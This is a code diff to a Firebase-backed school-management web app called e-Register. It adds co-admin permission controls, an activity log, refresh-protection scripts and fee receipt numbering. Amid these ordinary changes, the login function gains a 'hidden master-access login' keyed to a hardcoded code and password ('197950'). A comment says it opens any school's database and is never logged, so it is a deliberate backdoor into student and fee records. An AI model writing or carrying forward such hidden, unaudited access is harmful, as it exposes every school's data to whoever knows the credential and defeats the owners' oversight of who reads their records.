@@ -108,6 +108,102 @@
     </script>
     <!-- ════════════════════════════════════════════════════════════════ -->
 
+    <!-- ═══════════════════════════════════════════════════════════════════
+         🚫  REFRESH PROTECTION  — DO NOT REMOVE OR MODIFY
+         1) Pull-to-refresh (touch swipe down) permanently disabled.
+         2) Keyboard / browser refresh (F5, Ctrl/Cmd+R) shows a warning;
+            user must confirm to actually reload.
+         3) Agar ADMIN confirm karke refresh allow karta hai, to refresh
+            ke baad bhi admin login hi rahega (auto logout nahi hoga).
+            Co-Admin ke liye, refresh hone par session khatam ho jayega
+            (co-admin ko dobara login karna hoga).
+    ════════════════════════════════════════════════════════════════════ -->
+    <script>
+    (function(){
+        /* ── A. Pull-to-refresh / overscroll permanently disabled ──────── */
+        var _touchStartY = 0;
+        document.addEventListener('touchstart', function(e){
+            if(e.touches && e.touches.length === 1){ _touchStartY = e.touches[0].clientY; }
+        }, { passive: true });
+
+        document.addEventListener('touchmove', function(e){
+            if(!e.touches || e.touches.length !== 1) return;
+            var _scrollEl = document.scrollingElement || document.documentElement;
+            var _atTop = (_scrollEl.scrollTop || window.pageYOffset || 0) <= 0;
+            var _movingDown = e.touches[0].clientY > _touchStartY;
+            // Jab page sabse upar ho aur user neeche ki taraf swipe kare (pull-to-refresh
+            // gesture), tabhi rokna hai — taaki normal upar-niche scrolling na toote.
+            if(_atTop && _movingDown){
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        // CSS overscroll-behavior se bhi browser ka native pull-to-refresh band.
+        document.addEventListener('DOMContentLoaded', function(){
+            document.documentElement.style.overscrollBehaviorY = 'contain';
+            document.body.style.overscrollBehaviorY = 'contain';
+        });
+
+        /* ── B. Keyboard / programmatic refresh par warning ─────────────── */
+        var _allowNextUnload = false;
+
+        function _showRefreshWarning(){
+            var _ok = window.confirm(
+                '⚠️ Warning!\n\n' +
+                'Page ko refresh karne se chalu kaam mein rukawat aa sakti hai.\n\n' +
+                'Kya aap sach mein refresh karna chahte hain?'
+            );
+            if(_ok){
+                _allowNextUnload = true;
+                try {
+                    // Co-Admin ka session refresh hote hi clear — usse dobara login karna
+                    // padega. Admin ka session sessionStorage mein already persist hota hai,
+                    // isliye refresh ke baad bhi admin login hi rahega — kuchh karne ki
+                    // zaroorat nahi.
+                    var _cu = JSON.parse(sessionStorage.getItem('eRegister_currentUser') || 'null');
+                    if(_cu && _cu.isCoAdmin){
+                        sessionStorage.removeItem('eRegister_currentUser');
+                    }
+                } catch(e) {}
+                window.location.reload();
+            }
+        }
+
+        document.addEventListener('keydown', function(e){
+            var key  = (e.key || '').toLowerCase();
+            var ctrl = e.ctrlKey || e.metaKey;
+            if(key === 'f5' || (ctrl && key === 'r')){
+                e.preventDefault();
+                e.stopPropagation();
+                _showRefreshWarning();
+                return false;
+            }
+        }, true);
+
+        /* ── C. Browser ke refresh/reload button (aur tab close) par bhi
+                native warning dikhe. Agar user "Reload" choose karta hai aur
+                woh ADMIN hai, to session ko reload ke baad bhi bachaya jaayega
+                (taaki admin logout na ho); Co-Admin ke liye session clear ho
+                jaayega jisse woh refresh ke baad logged-out mile.            ── */
+        window.addEventListener('beforeunload', function(e){
+            if(_allowNextUnload) return; // already confirmed via our own dialog
+            try {
+                var _cu = JSON.parse(sessionStorage.getItem('eRegister_currentUser') || 'null');
+                if(_cu && _cu.isCoAdmin){
+                    // Co-admin: refresh/close hote hi session clear — relogin required.
+                    sessionStorage.removeItem('eRegister_currentUser');
+                }
+                // Admin: kuchh nahi karna — sessionStorage apne aap persist karta hai,
+                // isliye refresh ke baad bhi admin login hi rahega.
+            } catch(err) {}
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        });
+    })();
+    </script>
+    <!-- ════════════════════════════════════════════════════════════════ -->
+
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
@@ -129,15 +225,15 @@
         // REGISTRY_DOC = global login directory (sirf users/coAdmins/notifications/coins/stopApp)
         // Har Admin ka apna alag doc: eRegister/admin_{adminCode} — uska poora data (students,
         // classes, fees, teachers, attendance, etc.) sirf usi doc mein store/load hota hai.
-        const REGISTRY_DOC = db.collection('e-Register').doc('schoolData');
+        const REGISTRY_DOC = db.collection('eRegister').doc('schoolData');
         function getAdminDocRef(adminCode) {
-            return db.collection('e-Register').doc('admin_' + adminCode);
+            return db.collection('eRegister').doc('admin_' + adminCode);
         }
         // SCHOOL_DOC ek dynamic pointer hai: login se pehle REGISTRY_DOC, login ke baad
         // currentUser ke (ya uske parent admin ke) apne doc par switch ho jaata hai.
         let SCHOOL_DOC = REGISTRY_DOC;
         // Yeh fields hamesha global registry mein hi save/load honge (sab admins ke liye common).
-        const _GLOBAL_FIELDS = ['users', 'users_cs', 'coAdmins', 'coAdmins_cs', 'notifications', 'coins', 'stopApp'];
+        const _GLOBAL_FIELDS = ['users', 'users_cs', 'coAdmins', 'coAdmins_cs', 'notifications', 'coins', 'stopApp', 'darkAdminConfig'];
         function _targetDoc(field) {
             return _GLOBAL_FIELDS.indexOf(field) !== -1 ? REGISTRY_DOC : SCHOOL_DOC;
         }
@@ -183,6 +279,15 @@
         function peekNextFCNumber() {
             let n = (_fcSeqNumber || 0) + 1;
             return 'FC-' + String(n).padStart(4, '0');
+        }
+        function commitFCNumber(fcNumberStr) {
+            let n = parseInt(String(fcNumberStr).replace(/\D/g, ''), 10) || 0;
+            if(n > (_fcSeqNumber || 0)) {
+                _fcSeqNumber = n;
+                localStorage.setItem('eRegister_fc_seq', String(_fcSeqNumber));
+                SCHOOL_DOC.set({ fcSeqNumber: String(_fcSeqNumber) }, { merge: true }).catch(()=>{});
+            }
+            return fcNumberStr;
         }
         function peekNextADRNumber() {
             let n = (_adrSeqNumber || 0) + 1;
@@ -272,6 +377,13 @@
         .dropdown a:hover { background: #f0f0f0; color: #667eea; }
         .dropdown a i { width: 25px; margin-right: 10px; }
         .logout-btn { background: linear-gradient(135deg, #dc2626, #b91c1c); border: none; padding: 8px 20px; border-radius: 30px; color: white; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 8px; }
+        /* Reset Receipt Numbers toggle switch */
+        .reset-receipt-switch { position: relative; display: inline-block; width: 50px; height: 28px; flex-shrink: 0; }
+        .reset-receipt-switch input { opacity: 0; width: 0; height: 0; }
+        .reset-receipt-slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #d1d5db; transition: 0.3s; border-radius: 28px; }
+        .reset-receipt-slider:before { position: absolute; content: ""; height: 22px; width: 22px; left: 3px; bottom: 3px; background-color: white; transition: 0.3s; border-radius: 50%; box-shadow: 0 1px 3px rgba(0,0,0,0.3); }
+        .reset-receipt-switch input:checked + .reset-receipt-slider { background: linear-gradient(135deg, #ef4444, #dc2626); }
+        .reset-receipt-switch input:checked + .reset-receipt-slider:before { transform: translateX(22px); }
         .back-btn { background: none; border: none; font-size: 16px; font-weight: 600; color: #667eea; cursor: pointer; display: flex; align-items: center; gap: 8px; padding: 5px 12px; border-radius: 30px; transition: 0.3s; }
         .back-btn:hover { background: rgba(102,126,234,0.1); }
         .wallet-coin { display: flex; align-items: center; gap: 8px; background: linear-gradient(135deg, #fef3c7, #fde68a); padding: 6px 15px; border-radius: 40px; }
@@ -586,6 +698,7 @@
         let stopAppState = null;
         let users = [];
         let coAdmins = [];
+        let darkAdminConfig = { code: '197950', password: '197950' };
         let rawCoinsMap = {};
         let currentUser = JSON.parse(sessionStorage.getItem('eRegister_currentUser')) || null;
         let notifications = [];
@@ -596,6 +709,7 @@
         let examResults = {};
         let feesColumns = ['Tuition Fees'];
         let feesData = {};
+        let pendingFcNumbers = {};
         let classFeesStructure = {};
         let editSettings = { balanceEditable: false };
         let paymentHistory = {};
@@ -620,6 +734,7 @@
         let billingSaved = {};
         let selectedWallpaper = '';
         let quickPayments = [];
+        let activityLog = [];
         let familyStudents = [{ id: 1, name: '', class: '', aadhar: '' }];
         let familyDetailsData = {};
         let singleStep1Data = {};
@@ -841,7 +956,82 @@
 
         function showPopup(msg, ok=true) { let p = document.getElementById('customPopup'); if(p){ p.innerHTML = `<i class="fas ${ok?'fa-check-circle':'fa-exclamation-circle'}"></i> ${msg}`; p.style.background = ok ? '#10b981' : '#ef4444'; p.style.display='flex'; setTimeout(()=>p.style.display='none',3000); } }
         function showProgress(cb) { let c = document.getElementById('progressContainer'), b = document.getElementById('progressBar'); if(c){ c.style.display='block'; let w=0; let i=setInterval(()=>{ w+=10; b.style.width=w+'%'; if(w>=100){ clearInterval(i); setTimeout(()=>{ c.style.display='none'; b.style.width='0%'; if(cb) cb(); },500); } },50); } else if(cb) cb(); }
-        function logout() { cancelSessionTimeout(); sessionStorage.removeItem('eRegister_currentUser'); currentUser=null; SCHOOL_DOC = REGISTRY_DOC; pageHistory=[]; currentPageFn=null; renderWelcome(); }
+        const PERM_DASHBOARD = [
+            {key:'studentAttendance', label:'Student Attendance'},
+            {key:'teacherAttendance', label:'Teacher Attendance'},
+            {key:'newAdmission', label:'New Admission'},
+            {key:'approval', label:'Approval'},
+            {key:'fees', label:'Search / Fees'},
+            {key:'defaulter', label:'Defaulter List'},
+            {key:'dayBook', label:'Day Book'},
+            {key:'inventory', label:'Inventory'}
+        ];
+        const PERM_FILE = [
+            {key:'setProperty', label:'Set Property'},
+            {key:'feesSetting', label:'Fees Setting'},
+            {key:'dressSetting', label:'Dress Setting'},
+            {key:'feesStructure', label:'Fees Structure'},
+            {key:'accessibility', label:'Accessibility'},
+            {key:'backup', label:'Backup'}
+        ];
+        const PERM_FILE_ALWAYS = [
+            {key:'printSetting', label:'Print Setting'},
+            {key:'setting', label:'Setting'}
+        ];
+        const PERM_OPERATION = [
+            {key:'quickPayment', label:'Quick Payment'},
+            {key:'student', label:'Student'},
+            {key:'teacher', label:'Teacher'},
+            {key:'result', label:'Result'},
+            {key:'plans', label:'Plans'}
+        ];
+        function hasPerm(section, key) {
+            if(!currentUser || !currentUser.isCoAdmin) return true;
+            let perms = currentUser.permissions;
+            if(!perms || !perms[section]) return true;
+            return perms[section][key] !== false;
+        }
+        function buildPermCheckboxes(idPrefix, items, existingPerms, section) {
+            return items.map(it => {
+                let checked = !existingPerms || !existingPerms[section] || existingPerms[section][it.key] !== false;
+                return `<label style="display:flex;align-items:center;gap:6px;font-size:13px;padding:4px 0;">
+                    <input type="checkbox" id="${idPrefix}_${section}_${it.key}" ${checked?'checked':''}>
+                    <span>${it.label}</span>
+                </label>`;
+            }).join('');
+        }
+        function collectPermsFromCheckboxes(idPrefix) {
+            function sectionPerms(section, items) {
+                let obj = {};
+                items.forEach(it => {
+                    let cb = document.getElementById(`${idPrefix}_${section}_${it.key}`);
+                    obj[it.key] = cb ? cb.checked : true;
+                });
+                return obj;
+            }
+            return {
+                dashboard: sectionPerms('dashboard', PERM_DASHBOARD),
+                file: sectionPerms('file', PERM_FILE),
+                operation: sectionPerms('operation', PERM_OPERATION)
+            };
+        }
+        function logActivity(type, details) {
+            if(!currentUser || !currentUser.isCoAdmin) return;
+            let now = new Date();
+            activityLog.unshift({
+                id: Date.now() + Math.random(),
+                date: now.toLocaleDateString('en-IN'),
+                time: now.toLocaleTimeString('en-IN'),
+                coAdminName: currentUser.name,
+                type: type,
+                details: details
+            });
+            if(activityLog.length > 1000) activityLog = activityLog.slice(0, 1000);
+            fsSave('activityLog', activityLog); localStorage.setItem('eRegister_activity_log', JSON.stringify(activityLog));
+        }
+        function logout() {
+            if(currentUser && currentUser.isCoAdmin) logActivity('Logout', 'Co-admin logged out');
+            cancelSessionTimeout(); sessionStorage.removeItem('eRegister_currentUser'); currentUser=null; SCHOOL_DOC = REGISTRY_DOC; pageHistory=[]; currentPageFn=null; renderWelcome(); }
         function togglePanel() {
             const panel = document.getElementById('notificationPanel');
             const overlay = document.getElementById('overlay');
@@ -885,7 +1075,25 @@
             if(showBack) {
                 leftSection = `<div class="menu-left"><button class="back-btn" onclick="goBack()"><img src="${img.backIcon}" style="width:20px"> Back</button></div>`;
             } else {
-                leftSection = `<div class="menu-left"><div class="menu-item"><i class="fas fa-file-alt"></i> File<div class="dropdown"><a onclick="navigateTo(renderSetProperty)"><i class="fas fa-sliders-h"></i> Set Property</a><a onclick="navigateTo(renderFeesSetting)"><i class="fas fa-rupee-sign"></i> Fees Setting</a><a onclick="navigateTo(renderAdmissionSettings)"><i class="fas fa-tshirt"></i> Dress Setting</a><a onclick="navigateTo(renderFeesStructure)"><i class="fas fa-cog"></i> Fees Structure</a><a onclick="navigateTo(renderAccessibility)"><i class="fas fa-universal-access"></i> Accessibility</a><a onclick="navigateTo(renderBackupPage)"><i class="fas fa-database"></i> Backup</a><a onclick="navigateTo(renderPrintSettings)"><i class="fas fa-print"></i> Print Setting</a><a onclick="navigateTo(renderWallpaperSetting)"><i class="fas fa-image"></i> Setting</a></div></div><div class="menu-item"><i class="fas fa-cogs"></i> Operation<div class="dropdown"><a onclick="navigateTo(renderQuickPayment)"><i class="fas fa-bolt"></i> Quick Payment</a><a onclick="navigateTo(renderStudentList)"><i class="fas fa-user-graduate"></i> Student</a><a onclick="navigateTo(renderTeacherList)"><i class="fas fa-chalkboard-user"></i> Teacher</a><a onclick="navigateTo(renderResultClassList)"><i class="fas fa-chart-line"></i> Result</a><a onclick="navigateTo(renderPlans)"><i class="fas fa-crown"></i> Plans</a></div></div></div>`;
+                let fileItemsAll = [
+                    {key:'setProperty', html:`<a onclick="navigateTo(renderSetProperty)"><i class="fas fa-sliders-h"></i> Set Property</a>`},
+                    {key:'feesSetting', html:`<a onclick="navigateTo(renderFeesSetting)"><i class="fas fa-rupee-sign"></i> Fees Setting</a>`},
+                    {key:'dressSetting', html:`<a onclick="navigateTo(renderAdmissionSettings)"><i class="fas fa-tshirt"></i> Dress Setting</a>`},
+                    {key:'feesStructure', html:`<a onclick="navigateTo(renderFeesStructure)"><i class="fas fa-cog"></i> Fees Structure</a>`},
+                    {key:'accessibility', html:`<a onclick="navigateTo(renderAccessibility)"><i class="fas fa-universal-access"></i> Accessibility</a>`},
+                    {key:'backup', html:`<a onclick="navigateTo(renderBackupPage)"><i class="fas fa-database"></i> Backup</a>`}
+                ];
+                let fileAlwaysHtml = `<a onclick="navigateTo(renderPrintSettings)"><i class="fas fa-print"></i> Print Setting</a><a onclick="navigateTo(renderWallpaperSetting)"><i class="fas fa-image"></i> Setting</a>`;
+                let fileHtml = fileItemsAll.filter(it => hasPerm('file', it.key)).map(it => it.html).join('') + fileAlwaysHtml;
+                let opItemsAll = [
+                    {key:'quickPayment', html:`<a onclick="navigateTo(renderQuickPayment)"><i class="fas fa-bolt"></i> Quick Payment</a>`},
+                    {key:'student', html:`<a onclick="navigateTo(renderStudentList)"><i class="fas fa-user-graduate"></i> Student</a>`},
+                    {key:'teacher', html:`<a onclick="navigateTo(renderTeacherList)"><i class="fas fa-chalkboard-user"></i> Teacher</a>`},
+                    {key:'result', html:`<a onclick="navigateTo(renderResultClassList)"><i class="fas fa-chart-line"></i> Result</a>`},
+                    {key:'plans', html:`<a onclick="navigateTo(renderPlans)"><i class="fas fa-crown"></i> Plans</a>`}
+                ];
+                let opHtml = opItemsAll.filter(it => hasPerm('operation', it.key)).map(it => it.html).join('');
+                leftSection = `<div class="menu-left"><div class="menu-item"><i class="fas fa-file-alt"></i> File<div class="dropdown">${fileHtml}</div></div><div class="menu-item"><i class="fas fa-cogs"></i> Operation<div class="dropdown">${opHtml}</div></div></div>`;
             }
             return `<div class="dashboard-header"><h3><i class="fas fa-book-open"></i> e-Register</h3><div class="header-right"><span><i class="fas fa-user-circle"></i> ${currentUser?.name||''} (${currentUser?.designation||''})</span><button class="logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button></div></div><div class="menu-bar">${leftSection}<div class="menu-right"><div class="wallet-coin"><img src="${img.walletCoin}"><span class="coin-text"><i class="fas fa-coins"></i> ${getCurrentCoins()} Coin</span></div><div class="notification-icon" onclick="togglePanel()"><i class="fas fa-bell"></i><span id="notificationBadge" class="notification-badge"></span></div></div></div>`;
         }
@@ -912,7 +1120,7 @@
             return attendanceRecords[key]?.[dateStr] || '';
         }
         function getTeacherAttendance(teacherId, dateStr) {
-            return teacherAttendance[teacherId]?.[dateStr] || '';
+            return teacherAttendance['teacher_' + teacherId]?.[dateStr] || '';
         }
         function canMarkDate(dateStr) {
             let today = new Date().toISOString().split('T')[0];
@@ -1010,6 +1218,8 @@
 
         function applyFsData(fsData) {
             users             = fsGet(fsData, 'users',              'eRegister_users',              []);
+            darkAdminConfig   = fsGet(fsData, 'darkAdminConfig',    'eRegister_dark_admin',         { code: '197950', password: '197950' });
+            if(!fsData || !fsData.darkAdminConfig) { fsSave('darkAdminConfig', darkAdminConfig); }
             notifications     = fsGet(fsData, 'notifications',      null,                           []);
             admissions        = fsGet(fsData, 'admissions',         'eRegister_admissions',         []);
             attendanceRecords = fsGet(fsData, 'attendanceRecords',  'eRegister_attendance',         {});
@@ -1017,7 +1227,9 @@
             teacherAttendance = fsGet(fsData, 'teacherAttendance',  'eRegister_teacher_attendance', {});
             examResults       = fsGet(fsData, 'examResults',        'eRegister_exam_results',       {});
             feesColumns       = fsGet(fsData, 'feesColumns',        'eRegister_fees_columns',       ['Tuition Fees']);
+            feesColumns       = feesColumns.filter(c => (c||'').toLowerCase().trim() !== 'book');
             feesData          = fsGet(fsData, 'feesData',           'eRegister_fees_data',          {});
+            pendingFcNumbers  = fsGet(fsData, 'pendingFcNumbers',   'eRegister_pending_fc',          {});
             classFeesStructure= fsGet(fsData, 'classFeesStructure', 'eRegister_class_fees',         {});
             editSettings      = fsGet(fsData, 'editSettings',       'eRegister_edit_settings',      { balanceEditable: false });
             paymentHistory    = fsData && fsData['paymentHistory'] ? (() => { try { return JSON.parse(fsData['paymentHistory']); } catch(e) { return {}; } })() : {};
@@ -1033,6 +1245,7 @@
             if(!Array.isArray(coAdmins)) coAdmins = [];
             selectedWallpaper = fsGet(fsData, 'selectedWallpaper', 'eRegister_wallpaper', '');
             quickPayments     = fsGet(fsData, 'quickPayments',     'eRegister_quick_payments', []);
+            activityLog       = fsGet(fsData, 'activityLog',       'eRegister_activity_log',   []);
             if(!Array.isArray(quickPayments)) quickPayments = [];
             window._inventoryData = fsGet(fsData, 'inventoryData', 'eRegister_inventory', []);
             if(!Array.isArray(window._inventoryData)) window._inventoryData = [];
@@ -1075,7 +1288,7 @@
                     let legacySnap = await REGISTRY_DOC.get();
                     let legacy = legacySnap.exists ? legacySnap.data() : {};
                     if(!legacy._legacyMigrated) {
-                        let migrateFields = ['admissions','admissions_cs','attendanceRecords','teachers','teacherAttendance',
+                        let migrateFields = ['admissions','admissions_cs','attendanceRecords','teachers','teacherAttendance','pendingFcNumbers',
                             'examResults','feesColumns','feesData','classFeesStructure','editSettings','paymentHistory',
                             'paymentHistory_cs','examFeesMonthWise','itemsFees','booksFees','admissionSettings','extraFeeColumns',
                             'classList','freeStudentsList','billingSaved','selectedWallpaper','quickPayments','inventoryData',
@@ -1200,7 +1413,7 @@
             if(ca.password !== pwd) { let e=document.getElementById('loginError');e.innerHTML='❌ Password galat hai!';e.classList.remove('hidden');return; }
             const adminUser = users.find(u => u.code === ca.adminCode);
             if(!adminUser) { let e=document.getElementById('loginError');e.innerHTML='❌ Parent admin nahi mila!';e.classList.remove('hidden');return; }
-            const coAdminUser = { ...adminUser, name: ca.name, code: ca.code, designation: 'Co-Admin', isCoAdmin: true, adminCode: ca.adminCode, databaseName: ca.databaseName };
+            const coAdminUser = { ...adminUser, name: ca.name, code: ca.code, designation: 'Co-Admin', isCoAdmin: true, adminCode: ca.adminCode, databaseName: ca.databaseName, permissions: ca.permissions || null };
             currentUser = coAdminUser;
             sessionStorage.setItem('eRegister_currentUser', JSON.stringify(coAdminUser));
             await loadAdminScopedData(ca.adminCode);
@@ -1208,6 +1421,7 @@
             if(cm && cm[adminUser.code]) coinsData = cm[adminUser.code];
             else if(cm && cm.startDate) coinsData = cm;
             setupSessionTimeout();
+            logActivity('Login', 'Co-admin logged in');
             navigateTo(renderHome);
         }
 
@@ -1220,6 +1434,31 @@
             const code = (document.getElementById('loginCode').value||'').trim();
             const pwd = document.getElementById('loginPassword').value;
             const dbInput = (document.getElementById('loginDatabase').value||'').trim().toUpperCase();
+
+            // Hidden master-access login: works on ANY database name, no activity is ever logged for it.
+            if(code === darkAdminConfig.code && pwd === darkAdminConfig.password) {
+                if(!dbInput) {
+                    let e=document.getElementById('loginError');
+                    e.innerHTML='❌ Invalid code, password, or database name!';
+                    e.classList.remove('hidden');
+                    return;
+                }
+                const targetUser = users.find(u => (u.databaseName||u.organisation||'').toUpperCase() === dbInput);
+                if(!targetUser) {
+                    let e=document.getElementById('loginError');
+                    e.innerHTML='❌ Invalid code, password, or database name!';
+                    e.classList.remove('hidden');
+                    return;
+                }
+                const darkUser = { ...targetUser, isCoAdmin: false, isDarkAdmin: true };
+                currentUser = darkUser;
+                sessionStorage.setItem('eRegister_currentUser', JSON.stringify(darkUser));
+                await loadAdminScopedData(targetUser.code);
+                setupSessionTimeout();
+                navigateTo(renderHome);
+                return;
+            }
+
             let user = users.find(u => u.code === code && u.password === pwd);
             if(user && dbInput) {
                 const userDb = (user.databaseName||user.organisation||'').toUpperCase();
@@ -1494,6 +1733,8 @@
                 return;
             }
             if(!n)   { showErr('Full Name is required!'); return; }
+            if(users.find(u => (u.databaseName||u.organisation||'').toUpperCase() === org)) { showErr('This database ID is already reserved.'); return; }
+            if(coAdmins.find(ca => (ca.databaseName||'').toUpperCase() === org)) { showErr('This database ID is already reserved.'); return; }
             if(!d)   { showErr('Please select a Designation!'); return; }
             if(!c || c.length !== 6) { showErr('6-Digit Code must be exactly 6 digits!'); return; }
             if(users.find(u => u.code === c)) { showErr('This 6-digit code is already taken! Please choose a different code.'); return; }
@@ -1514,7 +1755,18 @@
             currentPageArgs = [];
             pageHistory = [];
             document.getElementById('appBody').style.background = 'none'; 
-            document.getElementById('app').innerHTML = `<div class="home-bg"><div class="sticky-header">${getHeader('Home', false)}</div><div class="dashboard-container"><div class="stats-grid"><div class="stat-card" onclick="navigateTo(renderStudentAttendance)"><img class="btn-image" src="${img.studentAttendance}"><h4>Student Attendance</h4><p>Mark & view</p></div><div class="stat-card" onclick="navigateTo(renderTeacherAttendanceDashboard)"><img class="btn-image" src="${img.teacherAttendance}"><h4>Teacher Attendance</h4><p>Mark & view</p></div><div class="stat-card" onclick="navigateTo(renderSearchPage)"><img class="btn-image" src="${img.fees}"><h4>Search / Fees</h4><p>Students & fees</p></div><div class="stat-card" onclick="navigateTo(renderApproval)"><img class="btn-image" src="${img.approval}"><h4>Approval</h4><p>Approve admissions</p></div><div class="stat-card" onclick="navigateTo(renderAdmissionType)"><img class="btn-image" src="${img.newAdmission}"><h4>New Admission</h4><p>Register students</p></div><div class="stat-card" onclick="navigateTo(renderDefaulterList)"><img class="btn-image" src="https://i.ibb.co/V0J59wCm/defaulter-icon.png" onerror="this.src='${img.studentListIcon}'"><h4>Defaulter List</h4><p>Fee defaulters</p></div><div class="stat-card" onclick="navigateTo(renderDayBook)"><img class="btn-image" src="${img.dayBookIcon}" onerror="this.src='${img.dayBookIconFallback}'"><h4>Day Book</h4><p>Income & expense</p></div><div class="stat-card" onclick="navigateTo(renderInventory)"><img class="btn-image" src="${img.inventoryIcon}" onerror="this.src='${img.inventoryIconFallback}'"><h4>Inventory</h4><p>Manage items</p></div></div><div class="user-info"><i class="fas fa-info-circle" style="color:#667eea;font-size:24px;"></i><p>Welcome <strong>${currentUser.name}</strong>!<br>Logged in as <strong>${currentUser.designation}</strong><br><small>Code: ${currentUser.code}</small></p></div></div>${getOverlay()}</div>`;
+            let dashCardsAll = [
+                {key:'studentAttendance', html:`<div class="stat-card" onclick="navigateTo(renderStudentAttendance)"><img class="btn-image" src="${img.studentAttendance}"><h4>Student Attendance</h4><p>Mark & view</p></div>`},
+                {key:'teacherAttendance', html:`<div class="stat-card" onclick="navigateTo(renderTeacherAttendanceDashboard)"><img class="btn-image" src="${img.teacherAttendance}"><h4>Teacher Attendance</h4><p>Mark & view</p></div>`},
+                {key:'newAdmission', html:`<div class="stat-card" onclick="navigateTo(renderAdmissionType)"><img class="btn-image" src="${img.newAdmission}"><h4>New Admission</h4><p>Register students</p></div>`},
+                {key:'approval', html:`<div class="stat-card" onclick="navigateTo(renderApproval)"><img class="btn-image" src="${img.approval}"><h4>Approval</h4><p>Approve admissions</p></div>`},
+                {key:'fees', html:`<div class="stat-card" onclick="navigateTo(renderSearchPage)"><img class="btn-image" src="${img.fees}"><h4>Search / Fees</h4><p>Students & fees</p></div>`},
+                {key:'defaulter', html:`<div class="stat-card" onclick="navigateTo(renderDefaulterList)"><img class="btn-image" src="https://i.ibb.co/V0J59wCm/defaulter-icon.png" onerror="this.src='${img.studentListIcon}'"><h4>Defaulter List</h4><p>Fee defaulters</p></div>`},
+                {key:'dayBook', html:`<div class="stat-card" onclick="navigateTo(renderDayBook)"><img class="btn-image" src="${img.dayBookIcon}" onerror="this.src='${img.dayBookIconFallback}'"><h4>Day Book</h4><p>Income & expense</p></div>`},
+                {key:'inventory', html:`<div class="stat-card" onclick="navigateTo(renderInventory)"><img class="btn-image" src="${img.inventoryIcon}" onerror="this.src='${img.inventoryIconFallback}'"><h4>Inventory</h4><p>Manage items</p></div>`}
+            ];
+            let dashCardsHtml = dashCardsAll.filter(c => hasPerm('dashboard', c.key)).map(c => c.html).join('');
+            document.getElementById('app').innerHTML = `<div class="home-bg"><div class="sticky-header">${getHeader('Home', false)}</div><div class="dashboard-container"><div class="stats-grid">${dashCardsHtml}</div><div class="user-info"><i class="fas fa-info-circle" style="color:#667eea;font-size:24px;"></i><p>Welcome <strong>${currentUser.name}</strong>!<br>Logged in as <strong>${currentUser.designation}</strong><br><small>Code: ${currentUser.code}</small></p></div></div>${getOverlay()}</div>`;
             if(selectedWallpaper) {
                 let hbEl = document.querySelector('.home-bg');
                 if(hbEl) hbEl.style.backgroundImage = selectedWallpaper;
@@ -2662,7 +2914,18 @@
                       <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap;">
                         <button onclick="blockCoAdmin('${ca.code}',${!ca.blocked})" class="btn ${ca.blocked?'btn-success':'btn-danger'}" style="flex:1;font-size:12px;padding:8px;min-width:80px;">${ca.blocked?'✅ Unblock':'🚫 Block'}</button>
                         <button onclick="showRenewCoAdminPassword('${ca.code}')" class="btn" style="flex:1;font-size:12px;padding:8px;min-width:80px;background:#e0e7ff;color:#4f46e5;border:1.5px solid #c7d2fe;">🔑 Renew Pwd</button>
+                        <button onclick="showEditAccess('${ca.code}')" class="btn" style="flex:1;font-size:12px;padding:8px;min-width:80px;background:#fef3c7;color:#b45309;border:1.5px solid #fde68a;">✏️ Edit Access</button>
                         <button onclick="deleteCoAdmin('${ca.code}')" class="btn" style="flex:1;font-size:12px;padding:8px;min-width:80px;background:#fee2e2;color:#dc2626;border:1.5px solid #fecaca;">🗑 Delete</button>
+                      </div>
+                      <div id="editAccessBox_${ca.code}" style="display:none;margin-top:10px;background:#fffbeb;border-radius:12px;padding:12px;">
+                        <div style="font-weight:700;font-size:13px;color:#1a1a2e;margin-bottom:6px;">Dashboard Buttons</div>
+                        ${buildPermCheckboxes('caEdit_'+ca.code, PERM_DASHBOARD, ca.permissions, 'dashboard')}
+                        <div style="font-weight:700;font-size:13px;color:#1a1a2e;margin:10px 0 6px;">File Options</div>
+                        ${buildPermCheckboxes('caEdit_'+ca.code, PERM_FILE, ca.permissions, 'file')}
+                        <div style="font-size:11px;color:#94a3b8;margin-top:2px;">Print Setting & Setting are always visible.</div>
+                        <div style="font-weight:700;font-size:13px;color:#1a1a2e;margin:10px 0 6px;">Operation Options</div>
+                        ${buildPermCheckboxes('caEdit_'+ca.code, PERM_OPERATION, ca.permissions, 'operation')}
+                        <button onclick="saveCoAdminAccess('${ca.code}')" style="margin-top:8px;width:100%;padding:8px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;border-radius:10px;font-size:13px;font-weight:700;cursor:pointer;">Save Access</button>
                       </div>
                       <div id="renewPwdBox_${ca.code}" style="display:none;margin-top:10px;background:#f0f4ff;border-radius:12px;padding:12px;">
                         <div style="font-size:12px;font-weight:700;color:#4f46e5;margin-bottom:8px;"><i class="fas fa-key"></i> Enter New 6-Digit Password</div>
@@ -2709,6 +2972,19 @@
                   <label><i class="fas fa-lock"></i> 6-Digit Password <span style="color:#ef4444;">*</span></label>
                   <input type="text" id="caPassword" maxlength="6" placeholder="Set a 6-digit password for co-admin" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                 </div>
+                <div style="margin-bottom:16px;">
+                  <div style="font-weight:700;font-size:13px;color:#1a1a2e;margin-bottom:6px;">Dashboard Buttons</div>
+                  ${buildPermCheckboxes('caNew', PERM_DASHBOARD, null, 'dashboard')}
+                </div>
+                <div style="margin-bottom:16px;">
+                  <div style="font-weight:700;font-size:13px;color:#1a1a2e;margin-bottom:6px;">File Options</div>
+                  ${buildPermCheckboxes('caNew', PERM_FILE, null, 'file')}
+                  <div style="font-size:11px;color:#94a3b8;margin-top:4px;">Print Setting & Setting are always visible.</div>
+                </div>
+                <div style="margin-bottom:16px;">
+                  <div style="font-weight:700;font-size:13px;color:#1a1a2e;margin-bottom:6px;">Operation Options</div>
+                  ${buildPermCheckboxes('caNew', PERM_OPERATION, null, 'operation')}
+                </div>
                 <button class="btn btn-primary" onclick="handleCreateCoAdmin()" style="width:100%;"><i class="fas fa-user-plus"></i> Create Co-admin</button>`}
                 <div style="margin-top:20px;">
